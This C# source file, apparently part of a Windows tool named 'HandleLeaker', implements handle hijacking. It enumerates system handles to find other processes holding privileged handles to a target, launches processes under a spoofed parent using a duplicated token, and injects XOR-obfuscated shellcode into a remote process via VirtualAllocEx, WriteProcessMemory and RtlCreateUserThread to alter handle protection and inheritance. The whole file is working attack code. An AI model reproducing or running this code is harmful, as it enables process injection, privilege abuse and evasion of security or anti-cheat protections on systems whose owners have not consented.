using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace HandleLeaker
{
    class Service
    {
        public struct HANDLE_INFO
        {
            public int Pid;
            public IntPtr hProcess;
        }

        private struct HANDLE_IN
        {
            public IntPtr hObject;
            public bool PStatus;
            public bool IStatus;
            public IntPtr Function;
        };

        public static IntPtr ServiceStartProcess(string lpFile, string lpArguments, string lpDir, Boolean Inherit, IntPtr hParent)
        {
            Kernel32.STARTUPINFOEX si = new Kernel32.STARTUPINFOEX();
            Kernel32.PROCESS_INFORMATION pi = new Kernel32.PROCESS_INFORMATION();
            IntPtr processToken = IntPtr.Zero, userToken = IntPtr.Zero, pEnvironment = IntPtr.Zero, cbAttributeListSize = IntPtr.Zero, pAttributeList = IntPtr.Zero;
            Advapi32.SECURITY_ATTRIBUTES sa = new Advapi32.SECURITY_ATTRIBUTES();
            pi.hProcess = IntPtr.Zero;
            if (!Kernel32.OpenProcessToken(Kernel32.GetCurrentProcess(), Kernel32.TOKEN_ALL_ACCESS, ref processToken))
                goto EXIT;
            if (!Advapi32.DuplicateTokenEx(processToken, Kernel32.TOKEN_ALL_ACCESS, out sa, Advapi32.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, Advapi32.TOKEN_TYPE.TokenPrimary, out userToken) ||
                !UserEnv.CreateEnvironmentBlock(ref pEnvironment, userToken, false))
                goto EXIT;
            Kernel32.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref cbAttributeListSize);
            pAttributeList = Kernel32.VirtualAlloc(IntPtr.Zero, (int)cbAttributeListSize, 0x1000, 0x40);
            if (pAttributeList == null)
                goto EXIT;
            if (!Kernel32.InitializeProcThreadAttributeList(pAttributeList, 1, 0, ref cbAttributeListSize))
                goto EXIT;
            if (!Kernel32.UpdateProcThreadAttribute(pAttributeList, 0, (IntPtr)0x00020000, ref hParent, (IntPtr)Marshal.SizeOf(hParent), IntPtr.Zero, IntPtr.Zero))
                goto EXIT;
            si.lpAttributeList = pAttributeList;
            si.StartupInfo = new Kernel32.STARTUPINFO();
            si.StartupInfo.cb = Marshal.SizeOf(typeof(Kernel32.STARTUPINFO));
            if (!Kernel32.CreateProcessAsUserA(userToken, lpFile, lpArguments, IntPtr.Zero, IntPtr.Zero, Inherit, 0x400 | 0x010 |  0x00080000, pEnvironment, lpDir, ref si, ref pi))
                goto EXIT;
            EXIT:
            if(processToken != IntPtr.Zero)
                Kernel32.CloseHandle(processToken);
            if (userToken != IntPtr.Zero)
                Kernel32.CloseHandle(userToken);
            if (pEnvironment != IntPtr.Zero)
                UserEnv.DestroyEnvironmentBlock(pEnvironment);
            if (pAttributeList != IntPtr.Zero)
            {
                Kernel32.DeleteProcThreadAttributeList(pAttributeList);
                Kernel32.VirtualFree(pAttributeList, (int)cbAttributeListSize, 0x4000);
            }
            if(pi.hThread != IntPtr.Zero)
            Kernel32.CloseHandle(pi.hThread);
            return pi.hProcess;
        }
        public static Boolean ServiceSetHandleStatus(CProcess Process, IntPtr hObject, bool Protect, bool Inherit)
        {
            bool Is64 = false, Status = true;
            byte[] W64Thread = { 0xC, 0xC7, 0xA8, 0x6C, 0x4B, 0xF2, 0x5, 0x4C, 0x8, 0xC9, 0x0, 0x60, 0x74, 0x5, 0xFD, 0x46, 0x44, 0x44, 0x44, 0xCC, 0x0, 0x60, 0x75, 0x4B, 0xF2, 0x5, 0x48, 0x8, 0xCF, 0x95, 0xC, 0xCF, 0x4D, 0xCC, 0x0, 0x60, 0x74, 0x5, 0xC9, 0x15, 0x46, 0x5, 0xBB, 0x16, 0x54, 0x77, 0x8D, 0xC1, 0x84, 0x4B, 0xD0, 0x85, 0xCF, 0x85, 0xC, 0xC7, 0x80, 0x6C, 0x87};
            byte[] W32Thread = { 0x11, 0xCF, 0xA8, 0xCF, 0x9, 0x4C, 0x2E, 0x46, 0x4B, 0xF2, 0x5, 0x40, 0xCC, 0x1, 0x4D, 0x4B, 0xF2, 0x5, 0x4C, 0xCC, 0x1, 0x4C, 0xC9, 0x1, 0x4C, 0x14, 0xCF, 0x5, 0x48, 0x2E, 0x40, 0xBB, 0x75, 0xBB, 0x94, 0xB3, 0x9C, 0x5F, 0x84, 0x4, 0x19, 0x86, 0x40, 0x44};
            HANDLE_IN Args;
            IntPtr hThread = IntPtr.Zero, lpArgs = IntPtr.Zero, lpThread = IntPtr.Zero, WThread = IntPtr.Zero, WArgs = IntPtr.Zero;

            if(hObject == IntPtr.Zero || Process.Is64(ref Is64) != 1)
            {
                Status = false;
                goto EXIT;
            }
            if (IntPtr.Size == 8)
            {
                if (!Is64)
                {
                    Status = false;
                    goto EXIT;
                }
            }
            else
            {
                if (Is64)
                {
                    Status = false;
                    goto EXIT;
                }
            }
            Args = new HANDLE_IN();
            Args.hObject = hObject;
            Args.IStatus = Inherit;
            Args.PStatus = Protect;
            Args.Function = Kernel32.GetProcAddress(Kernel32.GetModuleHandleA("ntdll.dll"), "NtSetInformationObject");
            if (Args.Function == IntPtr.Zero)
            {
                Status = false;
                goto EXIT;
            }

            if ((lpThread = Kernel32.VirtualAllocEx(Process.GetHandle(), IntPtr.Zero, Is64 ? W64Thread.Length : W32Thread.Length, 0x1000, 0x40)) == IntPtr.Zero ||
                (lpArgs = Kernel32.VirtualAllocEx(Process.GetHandle(), IntPtr.Zero, Marshal.SizeOf(typeof(HANDLE_IN)), 0x1000, 0x40)) == IntPtr.Zero)
            {
                Status = false;
                goto EXIT;
            }
            for (int i = 0; i < (Is64 ? W64Thread.Length : W32Thread.Length); i++)
            {
                if (Is64)
                    W64Thread[i] ^= 0x44;
                else
                    W32Thread[i] ^= 0x44;
            }
            WArgs = Marshal.AllocHGlobal(Marshal.SizeOf(WArgs));
            WThread = Marshal.AllocHGlobal(Is64 ? W64Thread.Length : W32Thread.Length);
            Marshal.Copy(Is64 ? W64Thread : W32Thread, 0, WThread, Is64 ? W64Thread.Length : W32Thread.Length);
            Marshal.StructureToPtr(Args, WArgs, true);
            if (!Kernel32.WriteProcessMemory(Process.GetHandle(),lpThread,WThread,Is64 ? W64Thread.Length : W32Thread.Length, IntPtr.Zero) ||
                !Kernel32.WriteProcessMemory(Process.GetHandle(), lpArgs, WArgs, Marshal.SizeOf(Args), IntPtr.Zero))
            {
                for (int i = 0; i < (Is64 ? W64Thread.Length : W32Thread.Length); i++)
                {
                    if (Is64)
                        W64Thread[i] ^= 0x44;
                    else
                        W32Thread[i] ^= 0x44;
                }
                Status = false;
                goto EXIT;
            }
            for (int i = 0; i < (Is64 ? W64Thread.Length : W32Thread.Length); i++)
            {
                if (Is64)
                    W64Thread[i] ^= 0x44;
                else
                    W32Thread[i] ^= 0x44;
            }

            if (ntdll.RtlCreateUserThread(Process.GetHandle(),IntPtr.Zero,false,IntPtr.Zero,IntPtr.Zero,IntPtr.Zero,lpThread,lpArgs, ref hThread,IntPtr.Zero) != 0)
            {
                Status = false;
                goto EXIT;
            }
            Kernel32.WaitForSingleObject(hThread, (0xFFFFFFFF));
            EXIT:
            if ((hThread) != IntPtr.Zero)
                Kernel32.CloseHandle(hThread);
            if((WArgs) != IntPtr.Zero)
                Marshal.FreeHGlobal(WArgs);
            if ((WThread) != IntPtr.Zero)
                Marshal.FreeHGlobal(WThread);
            if (lpThread != null)
                Kernel32.VirtualFreeEx(Process.GetHandle(), lpThread, Is64 ? W64Thread.Length : W32Thread.Length, 0x4000);
            if (lpArgs != null)
                Kernel32.VirtualFreeEx(Process.GetHandle(), lpArgs, Marshal.SizeOf(typeof(HANDLE_IN)), 0x4000);
            return Status;
        }
        public static List<HANDLE_INFO> ServiceEnumHandles(int ProcessId, UInt32 DesiredAccess)
        {

            UInt32 status = 0;
            IntPtr buffer = IntPtr.Zero, ipHandle = IntPtr.Zero;
            int bufferSize = 0;
            List<HANDLE_INFO> handlelist = new List<HANDLE_INFO>();
            IntPtr ProcessHandle = IntPtr.Zero, ProcessCopy = IntPtr.Zero;
            HANDLE_INFO hi;
            ntdll.SYSTEM_HANDLE wHandles = new ntdll.SYSTEM_HANDLE();
            long lHandleCount = 0;
            do
            {
                status = (UInt32)ntdll.NtQuerySystemInformation(0x10, buffer, bufferSize, ref bufferSize);
                if (status != 0)
                {
                    if (status == 0xc0000004)
                    {
                        if (buffer != null)
                            Kernel32.VirtualFree(buffer, bufferSize, 0x8000);
                        buffer = Kernel32.VirtualAlloc(IntPtr.Zero, bufferSize, 0x1000, 0x40);
                        continue;
                    }
                    break;
                }
                else
                {
                    if (IntPtr.Size == 8)
                    {
                        lHandleCount = Marshal.ReadInt64(buffer);
                        ipHandle = new IntPtr(buffer.ToInt64() + 8);
                    }
                    else
                    {
                        lHandleCount = Marshal.ReadInt32(buffer);
                        ipHandle = new IntPtr(buffer.ToInt32() + 4);
                    }

                    for (long i = 0; i < lHandleCount; i++)
                    {
                        wHandles = new ntdll.SYSTEM_HANDLE();
                        if (IntPtr.Size == 8)
                        {
                            wHandles = (ntdll.SYSTEM_HANDLE)Marshal.PtrToStructure(ipHandle, wHandles.GetType());
                            ipHandle = new IntPtr(ipHandle.ToInt64() + Marshal.SizeOf(wHandles));
                        }
                        else
                        {
                            ipHandle = new IntPtr(ipHandle.ToInt64() + Marshal.SizeOf(wHandles));
                            wHandles = (ntdll.SYSTEM_HANDLE)Marshal.PtrToStructure(ipHandle, wHandles.GetType());
                        }
                        ProcessHandle = Kernel32.OpenProcess(0x0040, false, wHandles.ProcessID);
                        if (Kernel32.DuplicateHandle(ProcessHandle, (IntPtr)(wHandles.Handle), Kernel32.GetCurrentProcess(), ref ProcessCopy, 0x0400, false, 0))
                        {
                            if (Kernel32.GetProcessId(ProcessCopy) == ProcessId &&
                                wHandles.ProcessID != ProcessId)
                            {
                                if ((((uint)(wHandles.GrantedAccess) & DesiredAccess)) == DesiredAccess)
                                {
                                    hi = new HANDLE_INFO();
                                    hi.Pid = wHandles.ProcessID;
                                    hi.hProcess = (IntPtr)(wHandles.Handle);
                                    handlelist.Add(hi);
                                }
                            }
                        } 
                        if (ProcessHandle != IntPtr.Zero)
                            Kernel32.CloseHandle(ProcessHandle);
                        if (ProcessCopy != IntPtr.Zero)
                            Kernel32.CloseHandle(ProcessCopy);
                    }
                    break;
                }
            } while (true);
            if (buffer != null)
                Kernel32.VirtualFree(buffer, bufferSize, 0x8000);
            return handlelist;
        }
    }
}
